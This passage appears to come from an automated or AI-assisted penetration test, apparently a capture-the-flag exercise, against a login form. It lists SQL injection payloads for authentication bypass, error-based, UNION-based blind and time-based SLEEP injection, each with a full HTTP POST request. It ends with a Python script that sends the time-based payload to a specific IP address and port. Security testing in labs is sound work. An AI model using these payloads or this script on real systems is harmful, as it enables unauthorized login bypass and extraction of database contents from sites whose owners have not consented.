Since the form interacts with the backend through a POST method, there's a potential that these inputs are directly used in SQL statements without proper sanitization, leading to SQL injection vulnerabilities.\n    \n    **source code**:\n    ```html\n    <form autocomplete=\"off\" class=\"form-wrapper\" method=\"POST\">\n        <img src=\"./uploads/a.jpeg\"/>\n        <input class=\"text-input\" id=\"login-username\" maxlength=\"60\" name=\"email\" placeholder=\"\u90ae\u7bb1\" type=\"email\" value=\"\"/>\n        <input class=\"text-input\" id=\"login-password\" name=\"password\" placeholder=\"\u5bc6\u7801\" type=\"password\" value=\"\"/>\n        <input class=\"pass-button-full pass-button-full-disabled\" type=\"submit\" value=\"\u767b\u5f55\"/>\n    </form>\n    ```\n    \n    **attack code**:\n    - Given this scenario, we can start testing for basic SQL injection with the username field by inserting:\n        - `admin'--`\n        - `admin' OR '1'='1`\n    - The complete HTTP request might look like this:\n    \n        ```\n        POST /login.php HTTP/1.1\n        Host: www.example.com\n        User-Agent: Mozilla/5.0\n        Content-Type: application/x-www-form-urlencoded\n        Content-Length: 60\n    \n        email=admin'--&password=anyvalue\n        ```\n\n2. Potential for Error-based SQL Injection\n\n    **Vulnerability description**:\n    - We can also test whether submission of deliberately malformed SQL can cause errors that might reveal SQL syntax details, hinting at deeper SQL injection vulnerability. This could make it possible to infer database structure indirectly.\n    \n    **source code**:\n    ```html\n    <input class=\"text-input\" id=\"login-username\" maxlength=\"60\" name=\"email\" placeholder=\"\u90ae\u7bb1\" type=\"email\" value=\"\"/>\n    <input class=\"text-input\" id=\"login-password\" name=\"password\" placeholder=\"\u5bc6\u7801\" type=\"password\" value=\"\"/>\n    ```\n    \n    **attack code**:\n    - Test input like:\n        - `email=test'\"`\n    - The resulting HTTP request might look like this:\n    \n        ```\n        POST /login.php HTTP/1.1\n        Host: www.example.com\n        User-Agent: Mozilla/5.0\n        Content-Type: application/x-www-form-urlencoded\n        Content-Length: 55\n    \n        email=test'&password=anyvalue\n        ```\n    - Observe the response to look for SQL errors.\n\n3. Blind or Time-based SQL Injection\n\n    **Vulnerability description**:\n    - If the application does not show errors directly, blind or time-based SQL injections could be attempted. This is useful for extracting data even when no detailed error messages are returned.\n    \n    **source code**:\n    ```html\n    <input class=\"text-input\" id=\"login-username\" maxlength=\"60\" name=\"email\" placeholder=\"\u90ae\u7bb1\" type=\"email\" value=\"\"/>\n    <input class=\"text-input\" id=\"login-password\" name=\"password\" placeholder=\"\u5bc6\u7801\" type=\"password\" value=\"\"/>\n    ```\n    \n    **attack code**:\n    - For Blind SQL Injection:\n        - `email=admin' AND 1=2 UNION SELECT 'a' FROM DUAL WHERE 1=1--`\n    - Time-based SQL Injection:\n        - `email=admin' AND SLEEP(5)--`\n        - The HTTP request might look like:\n        \n        ```\n        POST /login.php HTTP/1.1\n        Host: www.example.com\n        User-Agent: Mozilla/5.0\n        Content-Type: application/x-www-form-urlencoded\n        Content-Length: 60\n    \n        email=admin' AND SLEEP(5)--&password=anyvalue\n        ```\n\nThese steps involve initial probing to identify the nature of the vulnerability and verifying the presence of SQL injection.

If the application is vulnerable to SQL injection but hides the results, observing response time delays can indicate successful injections.\n\n### Step Forward: Time-based SQL Injection\n```python\nimport requests\n\n# Define the target URL\nurl = 'http://47.251.44.45:40618'\n\n# Define the time-based payload for SQL injection\npayload = {\"email\": \"admin' AND SLEEP(5)--\", \"password\": \"anyvalue\"}\n\n# Function to perform the time-based SQL injection attempt\ndef test_time_based_sql_injection(url, payload):\n    import time\n    start_time = time.time()\n    response = requests.post(url, data=payload)\n    end_time = time.time()\n    print(f\"Testing payload: {payload}\")\n    print(f\"Response Status Code: {response.status_code}\")\n    print(f\"Response Length: {len(response.content)}\")\n    print(f\"Response Time: {end_time - start_time} seconds\")\n\n# Execute the function with the given payload\ntest_time_based_sql_injection(url, payload)\n```\n\nThis payload uses a time-based blind SQL injection to check for vulnerabilities by delaying the backend's response.
